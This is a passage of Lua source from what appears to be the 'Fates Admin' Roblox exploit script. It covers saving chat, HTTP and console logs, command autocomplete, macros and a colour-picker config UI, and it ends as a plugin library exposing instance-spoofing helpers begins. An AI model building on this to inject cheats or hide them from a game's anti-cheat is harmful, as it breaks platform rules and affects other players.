            if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "E") then
                v.Visible = ShowErrors
            end
        end
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        Console.Errors.Text = ShowErrors and "Hide Errors" or "Show Errors"
    end), Connections.UI, true);
    AddConnection(CConnect(Console.Output.MouseButton1Click, function()
        ShowOutput = not ShowOutput
        local Children = GetChildren(Console.Frame.List);
        for i = 1, #Children do
            local v = Children[i]
            if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "P") then
                v.Visible = ShowOutput
            end
        end
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        Console.Output.Text = ShowOutput and "Hide Output" or "Show Output"
    end), Connections.UI, true);
end

AddConnection(CConnect(GetPropertyChangedSignal(ChatLogs.Search, "Text"), function()
    local Text = ChatLogs.Search.Text
    local Children = GetChildren(ChatLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text
            v.Visible = Sfind(lower(Message), Text, 1, true);
        end
    end
    ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(GlobalChatLogs.Search, "Text"), function()
    local Text = GlobalChatLogs.Search.Text

    local Children = GetChildren(GlobalChatLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text

            v.Visible = Sfind(lower(Message), Text, 1, true)
        end
    end
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(HttpLogs.Search, "Text"), function()
    local Text = HttpLogs.Search.Text

    local Children = GetChildren(HttpLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text
            v.Visible = Sfind(lower(Message), Text, 1, true)
        end
    end
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(Console.Search, "Text"), function()
    local Text = Console.Search.Text
    local Children = GetChildren(Console.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text
            v.Visible = Sfind(lower(Message), Text, 1, true)
        end
    end
    Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y)
end), Connections.UI, true);


AddConnection(CConnect(ChatLogs.Save.MouseButton1Click, function()
    local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
    local String =  format("Fates Admin Chatlogs for %s (%s)\n\n", GameName, os.date());
    local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
    local Name = format("mafia-admin/chatlogs/%s (%s).txt", GameName, TimeSaved);
    local Children = GetChildren(ChatLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            String = format("%s%s\n", String, v.Text);
        end
    end
    writefile(Name, String);
    Utils.Notify(LocalPlayer, "Saved", "Chat logs saved!");
end), Connections.UI, true);

AddConnection(CConnect(HttpLogs.Save.MouseButton1Click, function()
    local Children = GetChildren(HttpLogs.Frame.List);
    local Logs =  format("Fates Admin HttpLogs for %s\n\n", os.date());
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            Logs = format("%s%s\n", Logs, v.Text);
        end
    end
    if (not isfolder("mafia-admin/httplogs")) then
        makefolder("mafia-admin/httplogs");
    end
    writefile(format("mafia-admin/httplogs/HttpLogs for %s", gsub(tostring(os.date("%X")), ":", "-")) .. ".txt", gsub(Logs, "%b<>", ""));
    Utils.Notify(LocalPlayer, "Saved", "Http logs saved!");
end), Connections.UI, true);

AddConnection(CConnect(Console.Save.MouseButton1Click, function()
    local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
    local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
    local Children = GetChildren(Console.Frame.List);
    local String =  format("Fates Admin logs %s\nGame: %s - %d\n\n", TimeSaved, GameName, game.PlaceId);
    local Names = { ["P"] = "OUTPUT", ["W"] = "WARNING", ["E"] = "ERROR" }
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            String = format("%s[%s] %s\n", String, Names[sub(v.Name, 1, 1)] or "", v.Text);
        end
    end
    writefile("mafia-admin/logs.txt", String);
    Utils.Notify(LocalPlayer, "Saved", "Console Logs saved!");
end), Connections.UI, true);

-- auto correct
AddConnection(CConnect(GetPropertyChangedSignal(CommandBar.Input, "Text"), function() -- make it so that every space a players name will appear
    CommandBar.Input.Text = CommandBar.Input.Text
    local Text = CommandBar.Input.Text
    local Prediction = CommandBar.Input.Predict
    local PredictionText = Prediction.Text

    local Args = split(Text, " ")

    Prediction.Text = ""
    if (Text == "") then
        return
    end

    local FoundCommand = false
    local FoundAlias = false
    CommandArgs = CommandArgs or {}
    if (not CommandsTable[Args[1]]) then
        for _, v in next, CommandsTable do
            local CommandName = v.Name
            local Aliases = v.Aliases
            local FoundAlias
    
            if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
                Prediction.Text = CommandName
                CommandArgs = v.Args or {}
                break
            end
    
            for _, v2 in next, Aliases do
                if (Utils.MatchSearch(Args[1], v2)) then
                    FoundAlias = true
                    Prediction.Text = v2
                    CommandArgs = v2.Args or {}
                    break
                end
    
                if (FoundAlias) then
                    break
                end
            end
        end
    end

    for i, v in next, Args do -- make it get more players after i space out
        if (i > 1 and v ~= "") then
            local Predict = ""
            if (#CommandArgs >= 1) then
                for i2, v2 in next, CommandArgs do
                    if (lower(v2) == "player") then
                        Predict = Utils.GetPlayerArgs(v) or Predict;
                    else
                        Predict = Utils.MatchSearch(v, v2) and v2 or Predict
                    end
                end
            else
                Predict = Utils.GetPlayerArgs(v) or Predict;
            end
            Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
            local split = split(v, ",");
            if (next(split)) then
                for i2, v2 in next, split do
                    if (i2 > 1 and v2 ~= "") then
                        local PlayerName = Utils.GetPlayerArgs(v2)
                        Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
                    end
                end
            end
        end
    end

    if (Sfind(Text, "\t")) then -- remove tab from preditction text also
        CommandBar.Input.Text = PredictionText
        CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 1
    end
end))


do
    local Enabled = false
    local Connection;
    local Predict;
    ToggleChatPrediction = function()
        if (_L.Frame2) then
            return
        end
        if (not Enabled) then
            local RobloxChat = LocalPlayer.PlayerGui and FindFirstChild(LocalPlayer.PlayerGui, "Chat");
            local RobloxChatBarFrame;
            if (RobloxChat) then
                local RobloxChatFrame = FindFirstChild(RobloxChat, "Frame");
                if (RobloxChatFrame) then
                    RobloxChatBarFrame = FindFirstChild(RobloxChatFrame, "ChatBarParentFrame");
                end
            end
            local PredictionClone, ChatBar
            if (RobloxChatBarFrame) then
                local Frame1 = FindFirstChild(RobloxChatBarFrame, 'Frame');
                if Frame1 then
                    local BoxFrame = FindFirstChild(Frame1, 'BoxFrame');
                    if BoxFrame then
                        _L.Frame2 = FindFirstChild(BoxFrame, 'Frame');
                        if _L.Frame2 then
                            local TextLabel = FindFirstChild(_L.Frame2, 'TextLabel');
                            ChatBar = FindFirstChild(_L.Frame2, 'ChatBar');
                            if TextLabel and ChatBar then
                                PredictionClone = InstanceNew('TextLabel');
                                PredictionClone.Font = TextLabel.Font
                                PredictionClone.LineHeight = TextLabel.LineHeight
                                PredictionClone.MaxVisibleGraphemes = TextLabel.MaxVisibleGraphemes
                                PredictionClone.RichText = TextLabel.RichText
                                PredictionClone.Text = ''
                                PredictionClone.TextColor3 = TextLabel.TextColor3
                                PredictionClone.TextScaled = TextLabel.TextScaled
                                PredictionClone.TextSize = TextLabel.TextSize
                                PredictionClone.TextStrokeColor3 = TextLabel.TextStrokeColor3
                                PredictionClone.TextStrokeTransparency = TextLabel.TextStrokeTransparency
                                PredictionClone.TextTransparency = 0.3
                                PredictionClone.TextTruncate = TextLabel.TextTruncate
                                PredictionClone.TextWrapped = TextLabel.TextWrapped
                                PredictionClone.TextXAlignment = TextLabel.TextXAlignment
                                PredictionClone.TextYAlignment = TextLabel.TextYAlignment
                                PredictionClone.Name = "Predict"
                                PredictionClone.Size = UDim2.new(1, 0, 1, 0);
                                PredictionClone.BackgroundTransparency = 1
                            end
                        end
                    end
                end
            end

            ParentGui(PredictionClone, _L.Frame2);
            Predict = PredictionClone

            Connection = AddConnection(CConnect(GetPropertyChangedSignal(ChatBar, "Text"), function() -- todo: add detection for /e
                local Text = ChatBar.Text
                local Prediction = PredictionClone
                local PredictionText = PredictionClone.Text
            
                local Args = split(concat(shift(split(Text, ""))), " ");
            
                Prediction.Text = ""
                if (not startsWith(Text, Prefix)) then
                    return
                end
            
                local FoundCommand = false
                local FoundAlias = false
                CommandArgs = CommandArgs or {}
                if (not rawget(CommandsTable, Args[1])) then
                    for _, v in next, CommandsTable do
                        local CommandName = v.Name
                        local Aliases = v.Aliases
                        local FoundAlias
                
                        if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
                            Prediction.Text = Prefix .. CommandName
                            FoundCommand = true
                            CommandArgs = v.Args or {}
                            break
                        end
                
                        for _, v2 in next, Aliases do
                            if (Utils.MatchSearch(Args[1], v2)) then
                                FoundAlias = true
                                Prediction.Text = v2
                                CommandArgs = v.Args or {}
                                break
                            end
                
                            if (FoundAlias) then
                                break
                            end
                        end
                    end
                end
            
                for i, v in next, Args do -- make it get more players after i space out
                    if (i > 1 and v ~= "") then
                        local Predict = ""
                        if (#CommandArgs >= 1) then
                            for i2, v2 in next, CommandArgs do
                                if (lower(v2) == "player") then
                                    Predict = Utils.GetPlayerArgs(v) or Predict;
                                else
                                    Predict = Utils.MatchSearch(v, v2) and v2 or Predict
                                end
                            end
                        else
                            Predict = Utils.GetPlayerArgs(v) or Predict;
                        end
                        Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
                        local split = split(v, ",");
                        if (next(split)) then
                            for i2, v2 in next, split do
                                if (i2 > 1 and v2 ~= "") then
                                    local PlayerName = Utils.GetPlayerArgs(v2)
                                    Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
                                end
                            end
                        end
                    end
                end
            
                if (Sfind(Text, "\t")) then -- remove tab from preditction text also
                    ChatBar.Text = PredictionText
                    ChatBar.CursorPosition = #ChatBar.Text + 2
                end
            end))
            Enabled = true
            return ChatBar
        else
            Disconnect(Connection);
            Destroy(Predict);
            Enabled = false
        end
        return _L.Frame2
    end

    if (CurrentConfig.ChatPrediction) then
        delay(2, ToggleChatPrediction);
    end
end

local ConfigUILib = {}
do
    local GuiObjects = ConfigElements
    local PageCount = 0
    local SelectedPage
    local UserInputService = Services.UserInputService

    local Colors = {
        ToggleEnabled = Color3.fromRGB(5, 5, 6);
        Background = Color3.fromRGB(32, 33, 36);
        ToggleDisabled = Color3.fromRGB(27, 28, 31);
    }

    local ColorElements = ConfigElements.Elements.ColorElements
    local Overlay = ColorElements.Overlay
    local OverlayMain = Overlay.Main
    local ColorPicker = OverlayMain.ColorPicker
    local Settings = OverlayMain.Settings
    local ClosePicker = OverlayMain.Close
    local ColorCanvas = ColorPicker.ColorCanvas
    local ColorSlider = ColorPicker.ColorSlider
    local ColorGradient = ColorCanvas.ColorGradient
    local DarkGradient = ColorGradient.DarkGradient
    local CanvasBar = ColorGradient.Bar
    local RainbowGradient = ColorSlider.RainbowGradient
    local SliderBar = RainbowGradient.Bar
    local CanvasHitbox = ColorCanvas.Hitbox
    local SliderHitbox = ColorSlider.Hitbox
    local ColorPreview = Settings.ColorPreview
    local ColorOptions = Settings.Options
    local RedTextBox = ColorOptions.Red.TextBox
    local BlueTextBox = ColorOptions.Blue.TextBox
    local GreenTextBox = ColorOptions.Green.TextBox
    local RainbowToggle = ColorOptions.Rainbow

    local function UpdateClone()
        ConfigUIClone = Clone(ConfigUI);
    end

    function ConfigUILib.NewPage(Title)
        local Page = Clone(GuiObjects.Page.Container);
        local TextButton = Clone(GuiObjects.Page.TextButton);

        Page.Visible = true
        TextButton.Visible = true

        Utils.Click(TextButton, "BackgroundColor3")
            
        if PageCount == 0 then
            SelectedPage = Page
        end

        AddConnection(CConnect(TextButton.MouseButton1Click, function()
            if SelectedPage.Name ~= TextButton.Name then          
                SelectedPage = Page
                ConfigUI.Container.UIPageLayout:JumpTo(SelectedPage)
            end
        end))
        
        Page.Name = Title
        TextButton.Name = Title
        TextButton.Text = Title
        
        Page.Parent = ConfigUI.Container
        TextButton.Parent = ConfigUI.Selection
        
        PageCount = PageCount + 1


        UpdateClone()

        local function GetKeyName(KeyCode)
            local _, Stringed = pcall(UserInputService.GetStringForKeyCode, UserInputService, KeyCode);
            local IsEnum = Stringed == ""
            return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
        end

        local PageLibrary = {}

        function PageLibrary.CreateMacroSection(MacrosToAdd, Callback)
            local Macro = Clone(GuiObjects.Elements.Macro);
            local MacroPage = Macro.MacroPage
            local Selection = Page.Selection
            
            Selection.ClearAllChildren(Selection);
            for i,v in next, GetChildren(MacroPage) do
                v.Parent = Selection
            end
            Selection.Container.Visible = true
            local CommandsList = Selection.Container.Commands.Frame.List
            local CurrentMacros = Selection.Container.CurrentMacros
            local AddMacro = Selection.AddMacro
            local BindA, CommandA, ArgsA = AddMacro.Bind, AddMacro.Command, AddMacro["z Args"]
            local Add = AddMacro.AddMacro
            local Keybind = {};
            local Enabled = false
            local Connection
            
            local OnClick = function()
                Enabled = not Enabled
                if Enabled then
                    BindA.Text = "..."
                    local OldShiftLock = LocalPlayer.DevEnableMouseLock
                    LocalPlayer.DevEnableMouseLock = false
                    Keybind = {}
                    Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
                        if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
                            local Input2, Proccessed2;
                            CThread(function()
                                Input2, Proccessed2 = CWait(UserInputService.InputBegan);
                            end)()
                            CWait(UserInputService.InputEnded);
                            if (Input2 and not Processed) then
                                local KeyName, IsEnum = GetKeyName(Input.KeyCode);
                                local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
                                BindA.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
                                Keybind[1] = Input.KeyCode
                                Keybind[2] = Input2.KeyCode
                            else
                                local KeyName = GetKeyName(Input.KeyCode);
                                BindA.Text = KeyName
                                Keybind[1] = Input.KeyCode
                                Keybind[2] = nil
                            end
                            LocalPlayer.DevEnableMouseLock = OldShiftLock
                        else
                            BindA.Text = "Bind"
                        end
                        Enabled = false
                        Disconnect(Connection);
                    end));
                else
                    BindA.Text = "Bind"
                    Disconnect(Connection);
                end
            end

            AddConnection(CConnect(BindA.MouseButton1Click, OnClick));
            AddConnection(CConnect(Add.MouseButton1Click, function()
                if (BindA.Text == "Bind") then
                    Utils.Notify(nil, nil, "You must assign a keybind");
                    return
                end
                if (not CommandsTable[CommandA.Text]) then
                    Utils.Notify(nil, nil, "You must add a command");
                    return
                end
                Callback(Keybind, CommandA.Text, ArgsA.Text);
            end));

            local Focused = false
            local MacroSection = {
                CommandsList = CommandsList,
                AddCmd = function(Name) 
                    local Command = Clone(Macro.Command);
                    Command.Name = Name
                    Command.Text = Name
                    Command.Parent = CommandsList
                    Command.Visible = true
                    AddConnection(CConnect(Command.MouseButton1Click, function()
                        CommandA.Text = Name
                        ArgsA.CaptureFocus(ArgsA);
                        Focused = true
                        CWait(ArgsA.FocusLost);
                        CWait(UserInputService.InputBegan);
                        Focused = false
                        wait(.2);
                        if (not Focused) then
                            OnClick();
                        end
                    end))
                end,
                AddMacro = function(MacroName, Bind)
                    local NewMacro = Clone(Macro.EditMacro);
                    NewMacro.Bind.Text = Bind
                    NewMacro.Macro.Text = MacroName
                    NewMacro.Parent = CurrentMacros
                    NewMacro.Visible = true

                    Utils.Thing(NewMacro.Bind);
                    Utils.Thing(NewMacro.Macro);

                    FindFirstChild(NewMacro, "Remove").Name = "Delete"
                    AddConnection(CConnect(NewMacro.Delete.MouseButton1Click, function()
                        CWait(Utils.TweenAllTrans(NewMacro, .25).Completed);
                        Destroy(NewMacro);
                        for i = 1, #Macros do
                            if (Macros[i].Command == split(MacroName, " ")[1]) then
                                Macros[i] = nil
                            end
                        end
                        local TempMacros = clone(Macros);
                        for i, v in next, TempMacros do
                            for i2, v2 in next, v.Keys do
                                TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
                            end
                        end
                        SetConfig({Macros=TempMacros});
                    end))
                end
            }

            for i, v in next, MacrosToAdd do
                local Suc, Err = pcall(concat, v.Args, " ");
                if (not Suc) then
                    SetConfig({Macros={}});
                    Utils.Notify(LocalPlayer, "Error", "Macros were reset due to corrupted data")
                    break;
                end
                local KeyName, IsEnum = GetKeyName(v.Keys[1]);
                local Formatted;
                if (v.Keys[2]) then
                    local KeyName2, IsEnum2 = GetKeyName(v.Keys[2]); 
                    Formatted = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
                else
                    Formatted = KeyName
                end
                MacroSection.AddMacro(v.Command .. " " .. concat(v.Args, " "), Formatted);
            end

            return MacroSection
        end

        function PageLibrary.NewSection(Title)
            local Section = Clone(GuiObjects.Section.Container);
            local SectionOptions = Section.Options
            local SectionUIListLayout = SectionOptions.UIListLayout

            Section.Visible = true

            Utils.SmoothScroll(Section.Options, .14)
            Section.Title.Text = Title
            Section.Parent = Page.Selection
            
            
            SectionOptions.CanvasSize = UDim2.fromOffset(0,0) --// change
            AddConnection(CConnect(GetPropertyChangedSignal(SectionUIListLayout, "AbsoluteContentSize"), function()
                SectionOptions.CanvasSize = UDim2.fromOffset(0, SectionUIListLayout.AbsoluteContentSize.Y + 5);
            end));
            
            UpdateClone();

            local ElementLibrary = {}


            function ElementLibrary.Toggle(Title, Enabled, Callback)
                local Toggle = Clone(GuiObjects.Elements.Toggle);
                local Container = Toggle.Container

                local Switch = Container.Switch
                local Hitbox = Container.Hitbox
                
                if not Enabled then
                    Switch.Position = UDim2.fromOffset(2, 2)
                    Container.BackgroundColor3 = Colors.ToggleDisabled
                end
                local NoCallback = false

                local OnClick = function()
                    Enabled = not Enabled
                    
                    Utils.Tween(Switch, "Quad", "Out", .25, {
                        Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
                    })
                    Utils.Tween(Container, "Quad", "Out", .25, {
                        BackgroundColor3 = Enabled and Colors.ToggleEnabled or Colors.ToggleDisabled
                    })
                    
                    if (not NoCallback) then
                        Callback(Enabled);
                    end
                end

                AddConnection(CConnect(Hitbox.MouseButton1Click, OnClick));
                
                Toggle.Visible = true
                Toggle.Title.Text = Title
                Toggle.Parent = Section.Options
                Utils.Thing(Toggle.Title);

                UpdateClone()

                return function()
                    NoCallback = true
                    OnClick();
                    NoCallback = false
                end
            end

            function ElementLibrary.ScrollingFrame(Title, Callback, Elements, Toggles)
                local ScrollingFrame = Clone(GuiObjects.Elements.ScrollingFrame);
                local Frame = ScrollingFrame.Frame
                local Toggle = ScrollingFrame.Toggle

                for ElementTitle, Enabled in next, Elements do
                    local NewToggle = Clone(Toggle);
                    NewToggle.Visible = true
                    NewToggle.Title.Text = ElementTitle
                    NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");


                    Utils.Click(NewToggle.Plugins, "BackgroundColor3")

                    AddConnection(CConnect(NewToggle.Plugins.MouseButton1Click, function()
                        Enabled = not Enabled
                        NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");

                        Callback(ElementTitle, Enabled);
                    end));

                    NewToggle.Parent = Frame.Container
                end

                Frame.Visible = true
                Frame.Title.Text = Title
                Frame.Parent = Section.Options

                for _, NewToggle in next, GetChildren(Frame.Container) do
                    if (IsA(NewToggle, "GuiObject")) then
                        Utils.Thing(NewToggle.Title);
                    end
                end

                UpdateClone()
            end

            function ElementLibrary.Keybind(Title, Bind, Callback)
                local Keybind = Clone(GuiObjects.Elements.Keybind);
                local Enabled = false
                local Connection

                Keybind.Container.Text = Bind
                Keybind.Title.Text = Title

                local Container = Keybind.Container
                AddConnection(CConnect(Container.MouseButton1Click, function()
                    Enabled = not Enabled

                    if Enabled then
                        Container.Text = "..."
                        local OldShiftLock = LocalPlayer.DevEnableMouseLock
                        -- disable shift lock so it doesn't interfere with keybind
                        LocalPlayer.DevEnableMouseLock = false
                        Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
                            if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
                                local Input2, Proccessed2;
                                CThread(function()
                                    Input2, Proccessed2 = CWait(UserInputService.InputBegan);
                                end)()
                                CWait(UserInputService.InputEnded);
                                if (Input2 and not Processed) then
                                    local KeyName, IsEnum = GetKeyName(Input.KeyCode);
                                    local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
                                    -- Order by if it's an enum first, example 'Shift + K' and not 'K + Shift'
                                    Container.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
                                    Callback(Input.KeyCode, Input2.KeyCode);
                                else
                                    local KeyName = GetKeyName(Input.KeyCode);
                                    Container.Text = KeyName
                                    Callback(Input.KeyCode);
                                end
                                LocalPlayer.DevEnableMouseLock = OldShiftLock
                            else
                                Container.Text = "press"
                            end
                            Enabled = false
                            Disconnect(Connection);
                        end));
                    else
                        Container.Text = "press"
                        Disconnect(Connection);
                    end
                end));

                Utils.Click(Container, "BackgroundColor3");
                Keybind.Visible = true
                Keybind.Parent = Section.Options
                UpdateClone();
            end
            
            function ElementLibrary.TextboxKeybind(Title, Bind, Callback)
                local Keybind = Clone(GuiObjects.Elements.TextboxKeybind);
                
                Keybind.Container.Text = Bind
                Keybind.Title.Text = Title
                
                local Container = Keybind.Container
                AddConnection(CConnect(GetPropertyChangedSignal(Container, "Text"), function(Key)
                    if (#Container.Text >= 1) then
                        Container.Text = sub(Container.Text, 1, 1);
                        Callback(Container.Text);
                        Container.ReleaseFocus(Container);
                    end
                end))
                
                Keybind.Visible = true
                Keybind.Parent = Section.Options
                UpdateClone();
            end

            function ElementLibrary.ColorPicker(Title, DefaultColor, Callback)
                local SelectColor = Clone(ColorElements.SelectColor);
                local CurrentColor = DefaultColor
                local Button = SelectColor.Button
                local ToHSV = DefaultColor.ToHSV
                local Color3New = Color3.new
                local Color3fromHSV = Color3.fromHSV
                local UDim2New = UDim2.new
                local clamp = math.clamp

                local H, S, V = ToHSV(DefaultColor);
                local Opened = false
                local Rainbow = false
                
                local function UpdateText()
                    RedTextBox.PlaceholderText = tostring(math.floor(CurrentColor.R * 255))
                    GreenTextBox.PlaceholderText = tostring(math.floor(CurrentColor.G * 255))
                    BlueTextBox.PlaceholderText = tostring(math.floor(CurrentColor.B * 255))
                end
                
                local function UpdateColor()
                    H, S, V = ToHSV(CurrentColor);
                    
                    SliderBar.Position = UDim2New(0, 0, H, 2);
                    CanvasBar.Position = UDim2New(S, 2, 1 - V, 2);
                    ColorGradient.UIGradient.Color = Utils.MakeGradient({
                        [1] = Color3New(1, 1, 1);
                        [2] = Color3fromHSV(H, 1, 1);
                    })
                    
                    ColorPreview.BackgroundColor3 = CurrentColor
                    UpdateText();
                end
            
                local function UpdateHue(Hue)
                    SliderBar.Position = UDim2New(0, 0, Hue, 2);
                    ColorGradient.UIGradient.Color = Utils.MakeGradient({
                        [1] = Color3New(1, 1, 1);
                        [2] = Color3fromHSV(Hue, 1, 1);
                    });
                    
                    ColorPreview.BackgroundColor3 = CurrentColor
                    UpdateText();
                end
                
                local function ColorSliderInit()
                    local Moving = false
                    
                    local function Update()
                        if Opened and not Rainbow then
                            local LowerBound = SliderHitbox.AbsoluteSize.Y
                            local Position = clamp(Mouse.Y - SliderHitbox.AbsolutePosition.Y, 0, LowerBound);
                            local Value = Position / LowerBound
                            
                            H = Value
                            CurrentColor = Color3fromHSV(H, S, V);
                            ColorPreview.BackgroundColor3 = CurrentColor
                            ColorGradient.UIGradient.Color = Utils.MakeGradient({
                                [1] = Color3New(1, 1, 1);
                                [2] = Color3fromHSV(H, 1, 1);
                            });
                            
                            UpdateText();
                            
                            local Position = UDim2.new(0, 0, Value, 2)
                            local Tween = Utils.Tween(SliderBar, "Linear", "Out", .05, {
                                Position = Position
                            });
                            
                            Callback(CurrentColor);
                            CWait(Tween.Completed);
                        end
                    end
                
                    AddConnection(CConnect(SliderHitbox.MouseButton1Down, function()
                        Moving = true
                        Update()
                    end))
                    
                    AddConnection(CConnect(UserInputService.InputEnded, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
                            Moving = false
                        end
                    end))
                    
                    AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
                        if Moving then
                            Update()
                        end
                    end)))
                end
                local function ColorCanvasInit()
                    local Moving = false
                    
                    local function Update()
                        if Opened then
                            local LowerBound = CanvasHitbox.AbsoluteSize.Y
                            local YPosition = clamp(Mouse.Y - CanvasHitbox.AbsolutePosition.Y, 0, LowerBound)
                            local YValue = YPosition / LowerBound
                            local RightBound = CanvasHitbox.AbsoluteSize.X
                            local XPosition = clamp(Mouse.X - CanvasHitbox.AbsolutePosition.X, 0, RightBound)
                            local XValue = XPosition / RightBound
                            
                            S = XValue
                            V = 1 - YValue
                            
                            CurrentColor = Color3fromHSV(H, S, V);
                            ColorPreview.BackgroundColor3 = CurrentColor
                            UpdateText()
                            
                            local Position = UDim2New(XValue, 2, YValue, 2);
                            local Tween = Utils.Tween(CanvasBar, "Linear", "Out", .05, {
                                Position = Position
                            });
                            Callback(CurrentColor);
                            CWait(Tween.Completed);
                        end
                    end
                
                    AddConnection(CConnect(CanvasHitbox.MouseButton1Down, function()
                        Moving = true
                        Update()
                    end))
                    
                    AddConnection(CConnect(UserInputService.InputEnded, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
                            Moving = false
                        end
                    end))
                    
                    AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
                        if Moving then
                            Update()
                        end
                    end)))
                end
                
                ColorSliderInit()
                ColorCanvasInit()
                
                AddConnection(CConnect(Button.MouseButton1Click, function()
                    if not Opened then
                        Opened = true
                        UpdateColor()
                        RainbowToggle.Container.Switch.Position = Rainbow and UDim2New(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
                        RainbowToggle.Container.BackgroundColor3 = Color3.fromRGB(25, 25, 25);
                        Overlay.Visible = true
                        OverlayMain.Visible = false
                        Utils.Intro(OverlayMain)
                    end
                end))
                
                AddConnection(CConnect(ClosePicker.MouseButton1Click, Utils.Debounce(function()
                    Button.BackgroundColor3 = CurrentColor
                    Utils.Intro(OverlayMain)
                    Overlay.Visible = false
                    Opened = false
                end)))
                
                AddConnection(CConnect(RedTextBox.FocusLost, function()
                    if Opened then
                        local Number = tonumber(RedTextBox.Text)
                        if Number then
                            Number = clamp(floor(Number), 0, 255)
                            CurrentColor = Color3New(Number / 255, CurrentColor.G, CurrentColor.B)
                            UpdateColor()
                            RedTextBox.PlaceholderText = tostring(Number)
                            Callback(CurrentColor)
                        end
                        RedTextBox.Text = ""
                    end
                end))
                
                AddConnection(CConnect(GreenTextBox.FocusLost, function()
                    if Opened then
                        local Number = tonumber(GreenTextBox.Text)
                        if Number then
                            Number = clamp(floor(Number), 0, 255)
                            CurrentColor = Color3New(CurrentColor.R, Number / 255, CurrentColor.B)
                            UpdateColor()
                            GreenTextBox.PlaceholderText = tostring(Number)
                            Callback(CurrentColor)
                        end
                        GreenTextBox.Text = ""
                    end
                end))
                
                AddConnection(CConnect(BlueTextBox.FocusLost, function()
                    if Opened then
                        local Number = tonumber(BlueTextBox.Text)
                        if Number then
                            Number = clamp(floor(Number), 0, 255)
                            CurrentColor = Color3New(CurrentColor.R, CurrentColor.G, Number / 255)
                            UpdateColor()
                            BlueTextBox.PlaceholderText = tostring(Number)
                            Callback(CurrentColor)
                        end
                        BlueTextBox.Text = ""
                    end
                end))
                
                Utils.ToggleFunction(RainbowToggle.Container, false, function(Callback)
                    if Opened then
                        Rainbow = Callback
                    end
                end)
                
                AddConnection(CConnect(RenderStepped, function()
                    if Rainbow then
                        local Hue = (tick() / 5) % 1
                        CurrentColor = Color3.fromHSV(Hue, S, V)
                        
                        if Opened then
                            UpdateHue(Hue)
                        end
                        
                        Button.BackgroundColor3 = CurrentColor
                        Callback(CurrentColor, true);
                    end
                end))
                                
                Button.BackgroundColor3 = DefaultColor
                SelectColor.Title.Text = Title
                SelectColor.Visible = true
                SelectColor.Parent = Section.Options
                Utils.Thing(SelectColor.Title);
            end

            return ElementLibrary
        end

        return PageLibrary
    end
end

Utils.Click(ConfigUI.Close, "TextColor3")
AddConnection(CConnect(ConfigUI.Close.MouseButton1Click, function()
    ConfigLoaded = false
    CWait(Utils.TweenAllTrans(ConfigUI, .25).Completed);
    ConfigUI.Visible = false
end))
--END IMPORT [uimore]


--IMPORT [plugin]
PluginConf = IsSupportedExploit and GetPluginConfig();
local Plugins;

PluginLibrary = {
    LocalPlayer = LocalPlayer,
    Services = Services,
    GetCharacter = GetCharacter,
    ProtectInstance = ProtectInstance,
    SpoofInstance = SpoofInstance,
    SpoofProperty = SpoofProperty,
